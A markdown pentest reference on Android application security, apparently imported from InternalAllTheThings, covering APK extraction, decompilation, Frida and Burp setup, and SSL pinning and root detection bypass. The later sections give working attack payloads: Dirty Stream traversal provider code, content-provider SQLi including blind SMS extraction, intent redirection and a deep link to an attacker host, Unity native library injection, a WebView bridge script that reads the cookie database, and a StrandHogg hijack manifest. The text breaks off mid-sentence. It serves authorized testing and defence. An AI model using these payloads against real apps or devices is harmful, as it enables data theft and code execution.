---
title: Android Application
type: technique
tags: [android, binary, exploitation, network, reference-import, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-14
sources: [InternalAllTheThings, msrc-dirty-stream, hacktricks-mobile]
---

# Android Application

## What it is

Technical reference for **Android Application** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Android application security testing involves decompiling APKs with tools like `apktool` or `jadx` to review Smali bytecode and Java source, then analyzing the manifest for exported components, insecure permissions, and debug flags. Attackers intercept traffic via a local proxy (Burp Suite) by installing a custom CA certificate and routing device traffic through the proxy, using Frida or Objection to bypass SSL pinning at runtime. Sensitive data exposure in SharedPreferences, SQLite databases, and logcat output, as well as exploitable exported activities and content providers, are common findings.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Lab

* [payatu/diva-android](https://github.com/payatu/diva-android) - Damn Insecure and vulnerable App for Android
* [HTB VIP - Pinned](https://app.hackthebox.com/challenges/282) - Hack The Box challenge
* [HTB VIP - Manager](https://app.hackthebox.com/challenges/283) - Hack The Box challenge

## Extract APK

### ADB Method

Connect to ADB shell and list/download packages.
You might need to enable `Developer mode` and `Debugging` in order to connect with `adb`

```powershell
adb shell pm list packages
adb shell pm path com.example.someapp
adb pull /data/app/com.example.someapp-2.apk
```

### Stores

Warning: Downloading APK files from unofficial stores can compromise your device's security. These sources often host malware and malicious software. Always use trusted and official app stores for downloads.

* [Google Play](https://play.google.com/store/apps) - Official Store
* [Apkpure.fr](https://apkpure.fr/fr/) - Alternative to Google Play
* [Apkpure.co](https://apkpure.co) - Alternative to Google Play
* [Aptoide](https://fr.aptoide.com/) - Alternative to Google Play
* [Aurora Store](https://f-droid.org/fr/packages/com.aurora.store/) - Alternative to Google Play

Download APK from Google Play using a 3rd Party:

* [apkcombo.com](https://apkcombo.com/downloader/)
* [apps.evozi.com](https://apps.evozi.com/apk-downloader/)

## Static Analysis

### Extract Contents From APK

Search for strings `flag`,`secret`, the default string file is `Resources/resources.arsc/res/values/strings.xml`.

```powershell
apktool d application.apk
```

### Decompile Data as Java Code

* Rename `application.apk` to `application.zip`: `mv application.apk application.zip`
* Extract `classes.dex`: `unzip application.zip`
* Use `dex2jar` to obtain a jar file: `/usr/bin/d2j-dex2jar classes.dex`
* Use `jadx` using full CPU: `jadx classes.dex -j $(grep -c ^processor /proc/cpuinfo) -d Downloads/app/ > /dev/null`

```powershell
jadx-gui
--deobf # remove obfuscation by AndroGuard
-e      # generate a gradle project for Android Studio (easy to find function)
```

To reverse `.odex` you need to provide the `/system/framework/arm`, fortunately since we have the firmware we have it.

```powershell
java -jar baksmali-2.3.4.jar x application.odex -d k107-mb-8.1/system/framework/arm -o application
apktool d application.apk 
apktool b rebuild_folder -o rebuilt.apk
```

### Decompile Native Code

Native library are represented as `.so` files.
These libraries by default are included in the APK at the file path `/lib/<cpu>/lib<name>.so` or `/assets/<custom_name>`.

Use `IDA`, `Radare2/Cutter` or `Ghidra` to reverse them.

| CPU Native         | Library Path                |
|----------------------|-----------------------------|
| "generic" 32-bit ARM | lib/armeabi/libcalc.so      |
| x86                  | lib/x86/libcalc.so          |
| x64                  | lib/x86_64/libcalc.so       |
| ARMv7                | lib/armeabi-v7a/libcalc.so  |
| ARM64                | lib/arm64-v8a/libcalc.so    |

:warning: The shared object file (`.so`) doesn't need to be embedded in the app.

### Sign and Package APK

* `apktool` + `jarsigner`

```powershell
apktool b ./application.apk
keytool -genkey -v -keystore application.keystore -alias application -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore application.keystore application.apk application
zipalign -v 4 application.apk application-signed.apk
```

* `apktool` + `signapk`

```powershell
apktool b app-release
./signapk app-release/dist/app-release.apk
```

* [patrickfav/uber-apk-signer](https://github.com/patrickfav/uber-apk-signer) (Linux only)

```powershell
java -jar uber-apk-signer.jar --apks /path/to/apks
```

* [APK Toolkit v1.3](https://xdaforums.com/t/tool-apk-toolkit-v1-3-windows.4572881/) (Windows only)

### Mobile Security Framework Static

> Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.

* [MobSF - Documentation](https://mobsf.github.io/docs/#/)
* [MobSF - Github](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
* [MobSF - Live Demo](https://mobsf.live/)

Run [MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

* Latest version from DockerHub

```powershell
docker run -it --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
```

* Enable persistence on the Docker container

```powershell
docker run -it --rm --name mobsf -p 8000:8000 -v <your_local_dir>:/root/.MobSF opensecurity/mobile-security-framework-mobsf:latest
```

### Online Assets

:warning: Uploading APKs to uncontrolled websites risks data leaks, malware, intellectual property theft, and privacy violations. Use trusted platforms only to ensure the security and integrity of your app.

* [appetize.io](https://appetize.io/) - Instantly run mobile apps in your browser
* [mobsf.live](https://mobsf.live/) - Demo version of MobSF
* [hybrid-analysis.com](https://www.hybrid-analysis.com/sample/573df0b1cb5ffc0a25306be5ec83483ed1b2acdba37dd93223b9f14f42b2fdea?environmentId=200) - Sandbox analysis of APK files

### React Native and Hermes

Identify React Native app with `index.android.bundle` inside the `assets` folder

```ps1
Hermes: pip install hbctool
╰─$ hbctool disasm index.android.bundle indexasm
[*] Disassemble 'index.android.bundle' to 'indexasm' path
[*] Hermes Bytecode [ Source Hash: 4013cb75f7e16d4474f5cf258edc45ee16585560, HBC Version: 74 ]
[*] Done
```

### Flutter

Indentify Flutter use in the `MANIFEST.MF` and search for `libflutter.so`.

* [worawit/blutter](https://github.com/worawit/blutter) - Flutter Mobile Application Reverse Engineering Tool

```ps1
blutter jadx/resources/lib/arm64-v8a/ ./blutter_output
```

## Dynamic Analysis

Dynamic analysis for Android malware involves executing and monitoring an app in a controlled environment to observe its behavior. This technique detects malicious activities like data exfiltration, unauthorized access, and system modifications. Additionally, it aids in reverse engineering app features, revealing hidden functionalities and potential vulnerabilities for better threat mitigation.

### Burp Suite

* Proxy > Listen to all interfaces
* Import/Export CA certificate
* `adb push burp.der /sdcard/burp.crt`
* Open the Settings on the device and search "Install Cert"
* Click Install certificates from SD card
* Configure the AVD to use the proxy

```ps1
# Convert Burp certificate for Android
openssl x509 -inform DER -in burp.der -out burp.pem
openssl x509 -inform PEM -subject_hash_old -in burp.pem |head -1
mv burp.pem <hash output>.0

# Push the certificate in the AVD
emulator -list-avds
emulator -avd Pentesting_Device -writable-system
adb root
adb remount
adb push <hash>.0 /sdcard/

# Change the permissions
adb shell
mv /sdcard/<hash>.0 /system/etc/security/cacerts/
chmod 644 /system/etc/security/cacerts/<hash>.0
chown root:root /system/etc/security/cacerts/<hash>.0
```

### Frida

* [Frida - Documentation](https://frida.re/docs/android)
* [Frida - Github](https://github.com/frida/frida/)

Download [`frida`](https://github.com/frida/frida/releases) from releases.

```ps1
pip install frida-tools
unxz frida-server.xz
adb root # might be required
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

Interesting Frida scripts:

* [Universal Android SSL Pinning Bypass with Frida](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/) -  `frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f YOUR_BINARY`
* [frida-multiple-unpinning](https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/) - `frida --codeshare akabe1/frida-multiple-unpinning -f YOUR_BINARY`
* [aesinfo](https://codeshare.frida.re/@dzonerzy/aesinfo/) - `frida --codeshare dzonerzy/aesinfo -f YOUR_BINARY`
* [fridantiroot](https://codeshare.frida.re/@dzonerzy/fridantiroot/) - `frida --codeshare dzonerzy/fridantiroot -f YOUR_BINARY`
* [anti-frida-bypass](https://codeshare.frida.re/@enovella/anti-frida-bypass/) - `frida --codeshare enovella/anti-frida-bypass -f YOUR_BINARY`
* [xamarin-antiroot](https://codeshare.frida.re/@Gand3lf/xamarin-antiroot/) - `frida --codeshare Gand3lf/xamarin-antiroot -f YOUR_BINARY`
* [Intercept Android APK Crypto Operations](https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/) - `frida --codeshare fadeevab/intercept-android-apk-crypto-operations -f YOUR_BINARY`
* [Android Location Spoofing](https://codeshare.frida.re/@dzervas/android-location-spoofing/) - `frida --codeshare dzervas/android-location-spoofing -f YOUR_BINARY`
* [java-crypto-viewer](https://codeshare.frida.re/@Serhatcck/java-crypto-viewer/) - `frida --codeshare Serhatcck/java-crypto-viewer -f YOUR_BINARY`

### Runtime Mobile Security

> Runtime Mobile Security (RMS) 📱🔥 - is a powerful web interface that helps you to manipulate Android and iOS Apps at Runtime

* [RMS - Github](https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security)

**Requirements**:

* `adb`
* `frida`: server up and running on the target device

In case of issue with your favorite Browser, please use Google Chrome (fully supported).

* Install RMS

```powershell
npm install -g rms-runtime-mobile-security
```

* Make sure `frida-server` is up and running on the target device.
* Launch RMS: `rms`
* Open your browser at `http://127.0.0.1:5491/`
* Attach to the app, find name with `adb shell pm list package | grep NAME`

### Genymotion

Genymotion is a robust Android emulator designed for developers, offering fast and reliable virtual devices for app testing. It features GPS, battery, and network simulation, enabling comprehensive testing and development

* [Genymotion](https://www.genymotion.com/)
* [Genymotion Desktop](https://www.genymotion.com/product-desktop/)
* [Genymotion Device Image](https://www.genymotion.com/product-device-image/)
* [Genymotion SaaS](https://www.genymotion.com/product-cloud/)

### Android SDK emulator

Android Virtual Device (AVD) without Google Play Store.

* Download the files for an API 25 build

```powershell
sdkmanager "system-images;android-25;google_apis;x86_64"
```

* Create a device based on what we downloaded previously

```powershell
avdmanager create avd x86_64_api_25 -k "system-images;android-25;google_apis;x86_64"
```

* Run the emulator

```powershell
emulator @x86_64_api_25

emulator -list-avds
emulator -avd <non_production_avd_name> -writable-system -no-snapshot
emulator -avd Pixel_XL_API_31 -writable-system -http-proxy 127.0.0.1:8080
```

* Install the APK

```powershell
adb install ./challenge.apk
```

* Start the App

```powershell
adb shell monkey -p com.scottyab.rootbeer.sample 1
```

### Mobile Security Framework Dynamic

:warning: Dynamic Analysis will not work if you use MobSF docker container or setup MobSF inside a Virtual Machine.

**Requirements**:

* Genymotion (Supports x86_64 architecture Android 4.1 - 11.0, upto API 30)
    * Android 5.0 - 11.0 - uses Frida and works out of the box with zero configuration or setup.
    * Android 4.1 - 4.4 - uses Xposed Framework and requires MobSFy
* Genymotion Cloud
    * [Amazon Marketplace - TCP 5555](https://aws.amazon.com/marketplace/seller-profile?id=933724b4-d35f-4266-905e-e52e4792bc45)
    * [Azure Marketplace - TCP 5555](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/genymobile.genymotion-cloud)
* Android Studio Emulator (only Android images upto API 28 are supported)
    * AVD without Google Play Store

Dynamic Analysis from MobSF grants you the following features:

* Web API Viewer
* Frida API Monitor

### Appium

Appium is an open-source project and ecosystem of related software, designed to facilitate UI automation of many app platforms, including mobile (iOS, Android, Tizen), browser (Chrome, Firefox, Safari), desktop (macOS, Windows), TV (Roku, tvOS, Android TV, Samsung), and more!

* Install appium: `npm install -g appium`
* Install and validate the `uiautomator2` driver

```ps1
export JAVA_HOME=/usr/lib/jvm/default-java
export ANDROID_HOME=/home/user/Android/Sdk/
wget https://github.com/google/bundletool/releases/download/1.17.1/bundletool-all-1.17.1.jar
sudo mv bundletool-all-1.17.1.jar /usr/local/bin
appium driver install uiautomator2
appium driver doctor uiautomator2
```

* Start the server on the default host (0.0.0.0) and port (4723): `appium server`
* Install the Appium Python client: `pip install Appium-Python-Client`
* Use the [appium/appium-inspector](https://github.com/appium/appium-inspector) with the following capability

```json
{
"platformName": "Android",
"appium:automationName": "UiAutomator2"
}
```

Examples:

* [quickstarts/py/test.py](https://github.com/appium/appium/blob/master/packages/appium/sample-code/quickstarts/py/test.py)
* [quickstarts/js/test.js](https://github.com/appium/appium/blob/master/packages/appium/sample-code/quickstarts/js/test.js)
* [quickstarts/js/test.rb](https://github.com/appium/appium/blob/master/packages/appium/sample-code/quickstarts/rb/test.rb)

### Flutter

Repackage a Flutter Android application to allow Burp Suite proxy interception.

* [ptswarm/reFlutter](https://github.com/ptswarm/reFlutter) - Flutter Reverse Engineering Framework

```ps1
pip3 install reflutter
reflutter application.apk
```

* Sign the apk with [patrickfav/uber-apk-signer](https://github.com/patrickfav/uber-apk-signer/releases/tag/v1.2.1)

```ps1
java -jar ./uber-apk-signer-1.3.0.jar --apks release.apk
java -jar ./uber-apk-signer.jar --allowResign -a release.RE.apk
```

An alternative way to do it is using a rooted Android device with `zygisk-reflutter`.

* [yohanes/zygisk-reflutter](https://github.com/yohanes/zygisk-reflutter) - Zygisk-based reFlutter (Rooted Android with Magisk installed and Zygisk Enabled)

```ps1
adb push  zygiskreflutter_1.0.zip /sdcard/
adb shell su -c magisk --install-module /sdcard/zygiskreflutter_1.0.zip
adb reboot
```

## SSL Pinning Bypass

SSL certificate pinning in an APK involves embedding a server's public key or certificate directly into the app. This ensures the app only trusts specific certificates, preventing man-in-the-middle attacks by rejecting any certificates not matching the pinned ones, even if they are otherwise valid.

:warning: Android 9.0 is changing the defaults for Network Security Configuration to block all cleartext traffic.

* [shroudedcode/apk-mitm](https://github.com/shroudedcode/apk-mitm) - A CLI application that automatically prepares Android APK files for HTTPS inspection

```powershell
$ npx apk-mitm application.apk
npx: 139 installé(s) en 12.206s
╭ apk-mitm v0.6.1
├ apktool v2.4.1
╰ uber-apk-signer v1.1.0
Using temporary directory:
/tmp/87d3a4921ddf86cde634205480f89e90
✔ Decoding APK file
✔ Modifying app manifest
✔ Modifying network security config
✔ Disabling certificate pinning
✔ Encoding patched APK file
✔ Signing patched APK file
Done!  Patched file: ./application.apk
```

* [51j0/Android-CertKiller](https://github.com/51j0/Android-CertKiller) - An automation script to bypass SSL/Certificate pinning in Android

```powershell
python main.py -w #(Wizard mode)
python main.py -p 'root/Desktop/base.apk' #(Manual mode)
```

* [frida/frida](https://github.com/frida/frida) - Universal SSL Pinning Bypass

```javascript
$ adb devices
$ adb root
$ adb shell
$ phone:/# ./frida-server

// https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
$ frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f com.example.pinned

$ frida -U -f org.package.name -l universal-ssl-check-bypass.js --no-pause
Java.perform(function() {                
    var array_list = Java.use("java.util.ArrayList");
    var ApiClient = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) {
        var k = array_list.$new(); 
        return k;
    }
},0);
```

* [m0bilesecurity/RMS-Runtime-Mobile-Security](https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security) - Certificate Pinning bypass script (all + okhttpv3)
* [federicodotta/Brida](https://github.com/federicodotta/Brida) - The new bridge between Burp Suite and Frida

## Root Detection Bypass

Common root detection techniques:

* Su binaries: `su`/`busybox`
* Known Root Files/Paths : `Superuser.apk`
* Root Management Apps: `Magisk`, `SuperSU`
* RW paths:  `/system`, `/data` directories
* System Properties

Common bypass:

* [fridantiroot](https://codeshare.frida.re/@dzonerzy/fridantiroot/) - `frida --codeshare dzonerzy/fridantiroot -f YOUR_BINARY`
* [xamarin-antiroot](https://codeshare.frida.re/@Gand3lf/xamarin-antiroot/) - `frida --codeshare Gand3lf/xamarin-antiroot -f YOUR_BINARY`
* [multiple-root-detection-bypass/](https://codeshare.frida.re/@KishorBal/multiple-root-detection-bypass/) - `frida --codeshare KishorBal/multiple-root-detection-bypass -f YOUR_BINARY`

## Dirty Stream: FileProvider / content-provider path traversal

Dirty Stream (Microsoft, 2024) is a common vulnerability pattern in Android inter-app file sharing. A malicious app shares a file with a target app over a `content://` URI and controls the filename the target reads back from the sender's `ContentProvider`/`FileProvider`. A vulnerable receiver trusts that untrusted filename and uses it to build an output path inside its own private storage. A `../` traversal in the name then lets the sender write or overwrite arbitrary files in the target's home dir (`/data/data/<pkg>/`).

Impact depends on what gets overwritten in the victim's sandbox:
- Overwrite a native `.so` in the app's `files/lib` dir; on the next `System.load()` the attacker's library runs with the target app's permissions (code execution).
- Overwrite a config or SharedPreferences file to point the app at an attacker server, or to steal stored tokens/credentials (Microsoft found plaintext SMB/FTP creds stolen this way in Xiaomi File Manager).

### Vulnerable pattern

The receiver queries the sender's provider for `OpenableColumns.DISPLAY_NAME` (or `_data`) and joins it straight onto its files dir with no sanitization:

```java
// VULNERABLE receiver: attacker controls displayName, e.g. "../../files/lib/libtarget.so"
Uri uri = intent.getData();
Cursor c = getContentResolver().query(uri, null, null, null, null);
c.moveToFirst();
String displayName = c.getString(c.getColumnIndex(OpenableColumns.DISPLAY_NAME));
File out = new File(getFilesDir(), displayName);      // no path check -> traversal
try (InputStream in = getContentResolver().openInputStream(uri);
     OutputStream os = new FileOutputStream(out)) {   // writes outside intended dir
    // copy in -> os
}
```

A check that only validates the URI scheme (not the resolved path) does not help: a `checkValid` that returns true for any `content://` URI is exactly the bug Microsoft documented.

### Test recipe

1. In target static analysis, find exported components that accept a `content://` stream: exported activities/services/receivers handling `ACTION_SEND`/`ACTION_VIEW`, or a custom intent, that copy the incoming stream to internal storage.
2. Build a malicious app exposing its own `ContentProvider` that returns a traversal payload as the display name:

```java
// Attacker provider: poison the queried filename
@Override
public Cursor query(Uri uri, String[] proj, String sel, String[] args, String sort) {
    MatrixCursor cur = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
    cur.addRow(new Object[]{"../../files/lib/libtarget.so", payload.length});
    return cur;
}
```

3. Fire the intent at the target's exported handler with your `content://` URI as the stream:

```powershell
adb shell am start -n com.target.app/.ShareReceiverActivity \
  -a android.intent.action.SEND -t application/octet-stream \
  --eu android.intent.extra.STREAM content://com.attacker.fileprovider/payload
```

4. Confirm out of band: check the target's private dir for the planted file (`adb shell run-as com.target.app ls -l files/lib/`), then trigger the load/read path. Do not infer success from logs alone.

### Fix

Ignore the remote-supplied name entirely: cache incoming content under a locally generated random filename. If a name must be kept, strip path separators and verify with `File.getCanonicalPath()` that the resolved path stays inside the intended directory; avoid `Uri.getLastPathSegment()` (URL-decoded, still traversable). Pair this with the exported-component review under Static Analysis above.

## Android Debug Bridge

Android Debug Bridge (ADB) is a versatile command-line tool that enables communication between a computer and an Android device. It facilitates tasks like installing apps, debugging, accessing the device's shell, and transferring files, making it essential for developers and power users in Android development and troubleshooting.

### USB Debugging

* Open the **Settings** app.
* Select **System**.
* Scroll to the bottom and select **About phone**.
* Scroll to the bottom and tap **Build number** 7 times.
* Return to the previous screen to find **Developer options** near the bottom.
* Scroll down and enable **USB debugging**.

```ps1
./platform-tools/adb connect IP:PORT
./platform-tools/adb shell
```

### Wireless Debugging

* Open the **Settings** app.
* Select **System**.
* Scroll to the bottom and select **About phone**.
* Scroll to the bottom and tap **Build number** 7 times.
* Return to the previous screen to find **Developer options** near the bottom.
* Scroll down and enable **Wifi debugging**.
* Click on **Wifi debugging** to access the settings

One more step, you need to pair the devices using a code.

```ps1
./platform-tools/adb pair IP:PORT CODE
./platform-tools/adb connect IP:PORT
./platform-tools/adb shell
```

| Command                      | Description                                    |
|------------------------------|------------------------------------------------|
| `adb devices`                | List devices                                   |
| `adb connect <IP>:<PORT>`    | Connect to a remote device                     |
| `adb install app.apk`        | Install application                            |
| `adb uninstall app.apk`      | Uninstall application                          |
| `adb root`                   | Restarting adbd as root                        |
| `adb shell pm list packages` | List packages                                  |
| `adb shell pm list packages -3` | Show third party packages                   |
| `adb shell pm list packages -f` | Show packages and associated files          |
| `adb shell pm clear com.test.abc` | Delete all data associated with a package |
| `adb pull <remote> <local>`  | Download file                                  |
| `adb push <local> <remote>`  | Upload file                                    |
| `adb shell screenrecord /sdcard/demo.mp4`| Record video of the screen         |
| `adb shell am start -n com.test.abc` | Start an activity                      |
| `adb shell am startservice` | Start a service                                |
| `adb shell am broadcast`    | Send a broadcast                               |
| `adb logcat *:D`             | Show log with Debug level                      |
| `adb logcat -c`              | Clears the entire log                          |

## Android Virtual Device

An Android Virtual Device (AVD) is an emulator configuration that mimics a physical Android device. It allows developers to test and run Android apps in a simulated environment with specific hardware profiles, screen sizes, and Android versions, facilitating app testing without needing actual devices.

```ps1
emulator -avd Pixel_8_API_34 -writable-system
```

| Command                      | Description                                    |
|------------------------------|------------------------------------------------|
| `-tcpdump /path/dumpfile.cap`| Capture all the traffic in a file |
| `-dns-server X.X.X.X`        | Set DNS servers |
| `-http-proxy X.X.X.X:8080`   | Set HTTP proxy |
| `-port 5556`                 | Set the ADB TCP port number |

## Unlock Bootloader

**Requirements**:

* Enable `Settings` > `Developer Options` > `OEM unlocking`
* Enable `Settings` > `Developer Options` > `USB Debugging`

Unlock the bootloader will wipe the userdata partition. On some device these methods will require a key to successfully unlock the bootloader.

* Method 1

```ps1
adb reboot bootloader
fastboot oem unlock
```

* Method 2

```ps1
adb reboot bootloader
fastboot flashing unlock
```

* Methods based on the chip
    * For Qualcomm devices, you can use EDL (Emergency Download Mode)
    * For MediaTek devices, BROM (Boot ROM) mode
    * For Unisoc devices, Research Download Mode.

## Enumerating and attacking exported components with Drozer

Drozer runs an agent app on the device and gives you a REPL to introspect and invoke any
exported Activity, Service, BroadcastReceiver, or ContentProvider without writing a PoC app.
The exported attack surface is where authorization bypass, IPC abuse, and provider data
theft live. Install the agent, port-forward its listener (31415), then connect.

```bash
pip install drozer                       # host client (v3.x is Python 3, WithSecure fork)
adb install drozer-agent.apk             # on-device agent, press ON
adb forward tcp:31415 tcp:31415
drozer console connect
```

Enumerate and hit the surface:

```bash
run app.package.list -f <keyword>                 # find package name
run app.package.attacksurface <pkg>               # counts exported activities/providers/services + debuggable
run app.package.manifest <pkg>                     # dump manifest
# Activities: launch to bypass auth gates that assume you enter via the login activity
run app.activity.info -a <pkg>
run app.activity.start --component <pkg> <pkg>.SecretActivity
# Services: send a Message; msg.what/arg1/arg2 map to fields the handleMessage() reads
run app.service.send <pkg> <pkg>.AuthService --msg 2354 9234 1 --extra string PIN 1337 --bundle-as-obj
# BroadcastReceivers: fire an action with attacker extras (e.g. confused-deputy SMS send)
run app.broadcast.send --action org.owasp.goatdroid.SOCIAL_SMS --component <pkg> SendSMSNowReceiver \
  --extra string phoneNumber 123456789 --extra string message "pwn"
run app.package.debuggable                          # list debuggable apps
```

Agentless equivalent for activities from a plain shell: `adb shell am start -n <pkg>/<pkg>.SecretActivity`.
On API 31+ every component must declare `android:exported`, so grep the merged manifest for
`exported="true"` as the fast static path.

## Exploiting ContentProviders: SQLi, path traversal, and blind write oracle

Exported providers back onto SQLite DBs or the filesystem. `--projection` and `--selection`
(WHERE) are concatenated into SQL by many providers, giving injection; file-backed providers
give path traversal. Modern devices ship `cmd content` so you need no agent.

Drozer discovery and exploitation:

```bash
run app.provider.info -a <pkg>                       # authorities + read/write perms (note perm omissions)
run scanner.provider.finduris -a <pkg>               # brute reachable content:// URIs
run app.provider.query content://<auth>/Passwords/ --vertical
run scanner.provider.injection -a <pkg>              # auto SQLi in projection/selection
run scanner.provider.sqltables -a <pkg>              # enumerate tables
run scanner.provider.traversal -a <pkg>              # auto path traversal
run app.provider.read content://<auth>/../../../../etc/hosts
# manual SQLi via projection to read schema:
run app.provider.query content://<auth>/Passwords/ --projection "* FROM sqlite_master;--"
```

Agentless with `cmd content` (ADB >= 8.0):

```bash
adb shell cmd content query  --uri content://<auth>/items/
adb shell cmd content update --uri content://<auth>/items/1 --bind price:d:1337
adb shell cmd content call   --uri content://<auth> --method <m> --arg foo
```

Blind SQLi via `update()` when writePermission is omitted (a common OEM bug): if a provider
sets readPermission but not writePermission and its `update()` concatenates the caller WHERE,
you get a Boolean oracle. `update()` returns rows-affected (or throws a UNIQUE-constraint error)
which is TRUE, letting you exfiltrate co-located privileged tables (for example `sms`) one char
at a time. Seed a row with `insert` first if the target table is empty.

```bash
# TRUE if first char of latest SMS body is a digit (48..57)
adb shell cmd content update --uri content://<auth>/x --bind rowid:s:123 \
  --where '1=1 AND unicode(substr((SELECT body FROM sms ORDER BY rowid DESC LIMIT 1),1,1)) BETWEEN 48 AND 57'
```

Recent real bugs: CVE-2024-43089 (MediaProvider `openFile()` traversal, arbitrary read of any
app private storage), CVE-2025-10184 (OnePlus telephony provider permission bypass).

## Intent injection, redirection (CWE-926) and hijacking

Three distinct classes. (1) Deep-link to sink: an exported VIEW+BROWSABLE activity forwards a
URL query param into a WebView or other sink. (2) Intent redirection: an exported proxy reads
an attacker Intent from an extra (`redirect_intent`, `next_intent`) or `Intent.parseUri()` and
`startActivity()`s it under the victim UID, reaching non-exported components or granting
`content://` URI permissions to the attacker (confused deputy). (3) Intent hijacking: attacker
registers an intent-filter matching an implicit Intent the victim sends (OAuth callback, camera
result) and steals the tokens in it.

```bash
# Deep link forced into internal WebView
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Redirection: proxy forwards an attacker Intent to a privileged internal activity
adb shell am start -n com.target/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'

# Redirection that preserves URI-grant flags (0x43 = READ|WRITE|PERSISTABLE grant)
adb shell am start -n com.victim/.SdkProxyActivity \
  --es payload '{"n_intent_uri":"intent:#Intent;action=android.intent.action.VIEW;data=content://com.victim.fileprovider/root/secret.xml;launchFlags=0x43;end"}'
```

Hunting: grep decompiled code for `getParcelableExtra("redirect_intent")`, `Intent.parseUri(..., URI_ALLOW_UNSAFE)`,
and `startActivity`/`sendBroadcast` on attacker-influenced Intents with no `getCallingPackage()`
check. Automate extra/type discovery from Smali with APK Components Inspector (emits ready-to-run
`am`/`cmd content` lines). Type-aware `am` flags: `--es` string, `--ei` int, `--ez` bool,
`--el` long, `--ef` float, `--eu` URI, `--ecn` component. Runtime capture/replay of live Intents
inside `system_server` with IRIS (Frida). Real CVEs: CVE-2024-26131 (Element), CVE-2022-36837
(Samsung Email), CVE-2020-14116 (Mi Browser).

## Unity runtime intent-to-CLI pre-init native library injection (CVE-2025-59489)

Unity Android apps use `com.unity3d.player.UnityPlayerActivity` (exported by default in many
templates) and treat a string extra named `unity` as Unity command-line flags. The undocumented
flag `-xrsdk-pre-init-library <abs-path>` causes `dlopen(path, RTLD_NOW)` very early in init,
loading an attacker ELF into the victim process with its UID and permissions (camera, mic,
storage, in-app session). Any local app can trigger it; if the activity also has BROWSABLE, a
website can via an `intent:` URL.

```bash
# Local: point at a payload ELF readable by the victim (attacker app native lib dir, or the
# victim's own private cache which satisfies the linker permitted_paths under /data)
adb shell am start -n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
  -e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER==/lib/arm64/libpayload.so"
```

The file need not end in `.so` (dlopen checks ELF headers). SELinux/linker namespaces block
`/sdcard` paths, so the reliable path is an absolute location under the victim app private
storage (cache-to-ELF). Patched in Unity Sept-2025 advisory.

## Android WebView attacks: JS bridge, native file read, order-of-checks

Once you control content in an app WebView (via a deep-link `url=` sink, `loadData()` XSS from
an exported Intent extra, or a permissive host allowlist), the prizes are the JavaScript bridge
and native file sinks. `addJavascriptInterface` exposes `@JavascriptInterface` methods to the
page; a dispatcher-style bridge (`invokeMethod(json)`) that routes on a `handlerName` often has
a handler that reads a `file://`/`uri` param via `new File(...)` in native code, bypassing
`setAllowFileAccess(false)`.

```bash
# XSS via exported activity that pushes an Intent extra into loadData()
adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror="alert(1)">'
```

```javascript
// enumerate exposed bridge objects from the page
for (let k in window) { try { if (typeof window[k]==='object'||typeof window[k]==='function') console.log('[JSI]',k);} catch(e){} }

// arbitrary file read -> Base64 exfil of the WebView cookie DB (session hijack)
xbridge.invokeMethod(JSON.stringify({
  handlerName:'toBase64', callbackId:'cb_'+Date.now(),
  data:{ uri:'file:///data/data/<pkg>/app_webview/Default/Cookies' }
}));
```

Flawed host checks to watch for: `host.endsWith(".trusted.com") || ".trusted.com".endsWith(host)`
(the second clause admits unintended hosts) and `setJavaScriptEnabled(true)` executed before the
final URL allowlist check. Enable remote debugging for enumeration:
`WebView.setWebContentsDebuggingEnabled(true)` then chrome://inspect (force it on release builds
with LSPosed/Frida). Exfil primitive: `XMLHttpRequest` to `file:///data/data/<pkg>/databases/*.db`.

## Task hijacking (StrandHogg) via taskAffinity

Every activity inherits `taskAffinity` equal to the app package unless the dev sets
`android:taskAffinity=""`. A malicious app declaring an activity with the victim package as its
affinity can get merged into the victim back-stack; when the user later opens the real app,
Android surfaces the attacker activity first, ideal for phishing and permission-grant abuse.
Works on standard launch mode too (the app hides itself with `moveTaskToBack(true)`). Mitigated
by default on Android 11+ (tasks not shared across UIDs); older versions vulnerable.

```xml
<activity android:name=".EvilActivity" android:exported="true"
          android:taskAffinity="com.victim.package" android:launchMode="singleTask">
  <intent-filter><action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
</activity>
```

Detection:

```bash
apkanalyzer manifest print app.apk | grep -i taskaffinity        # empty/custom affinity = safe
adb shell dumpsys activity activities | grep -E "Root|affinity"  # top activity pkg != task affinity = red flag
```

StrandHogg 2.0 (CVE-2020-0096) is the reflection-based variant that re-parents into any task at
